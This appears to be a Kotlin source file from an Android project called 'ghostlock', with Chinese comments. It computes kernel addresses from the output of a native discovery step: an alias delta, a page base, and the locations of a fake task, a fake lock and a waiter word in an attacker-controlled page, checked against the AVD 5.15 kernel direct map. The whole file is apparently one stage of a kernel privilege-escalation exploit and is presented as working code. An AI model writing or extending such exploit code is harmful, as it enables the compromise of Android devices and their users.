package com.ghostlock.app.engine.ktstep

/** Kotlin 侧把 discover 的原始读数变成候选页地址；C++ 不计算 alias。 */
data class KernelPageAddresses(
    val aliasDelta: Long,
    val pageBase: Long,
    val fakeTask: Long,
    val fakeLock: Long,
    val waiterWord: Long,
)

sealed interface DiscoverProcessResult {
    data class Ready(val addresses: KernelPageAddresses) : DiscoverProcessResult
    data class Refused(val reason: String) : DiscoverProcessResult
}

class DiscoverProcessor(
    private val payloadOffset: Long,
    private val slots: PayloadSlots,
) {
    /**
     * 候选换算：`alias_delta = found - (words_base + payload_offset)`；
     * `page_base = alias_delta + user_page`。
     * 这是候选，不对“found 一定是目标页”做默认；非 canonical/溢出直接拒绝。
     */
    fun process(result: NativeDiscoverResult, userPageAddress: Long): DiscoverProcessResult {
        val answer = when (result) {
            is NativeDiscoverResult.Errno -> return DiscoverProcessResult.Refused("errno:" + result.code)
            is NativeDiscoverResult.Malformed -> return DiscoverProcessResult.Refused("malformed:" + result.reason)
            is NativeDiscoverResult.Ok -> result
        }
        if (!answer.ran) return DiscoverProcessResult.Refused("ran=false")
        if (answer.verdict != 1) return DiscoverProcessResult.Refused("verdict:" + answer.verdict)
        if (answer.found == 0L || answer.wordsBase == 0L || userPageAddress == 0L) {
            return DiscoverProcessResult.Refused("address")
        }
        val alias = try {
            Math.subtractExact(answer.found, Math.addExact(answer.wordsBase, payloadOffset))
        } catch (overflow: ArithmeticException) {
            return DiscoverProcessResult.Refused("alias-overflow")
        }
        val pageBase = try {
            Math.addExact(alias, userPageAddress)
        } catch (overflow: ArithmeticException) {
            return DiscoverProcessResult.Refused("page-overflow")
        }
        if (!canonical(pageBase)) return DiscoverProcessResult.Refused("page-noncanonical")
        val fakeTask = add(pageBase, slots.fakeTask) ?: return DiscoverProcessResult.Refused("task")
        val fakeLock = add(pageBase, slots.lock) ?: return DiscoverProcessResult.Refused("lock")
        val waiter = add(pageBase, slots.waiter) ?: return DiscoverProcessResult.Refused("waiter")
        if (!canonical(fakeTask) || !canonical(fakeLock) || !canonical(waiter)) {
            return DiscoverProcessResult.Refused("slot-noncanonical")
        }
        return DiscoverProcessResult.Ready(
            KernelPageAddresses(alias, pageBase, fakeTask, fakeLock, waiter),
        )
    }

    private fun add(base: Long, offset: Int): Long? = try {
        Math.addExact(base, offset.toLong())
    } catch (overflow: ArithmeticException) {
        null
    }

    /* AVD 5.15 的 direct map 在 0xffffff80..0xffffffc0；比只看 bit48 更严格。 */
    private fun canonical(address: Long): Boolean {
        val top = address ushr 32
        return top in 0xFFFFFF80L..0xFFFFFFC0L
    }
}
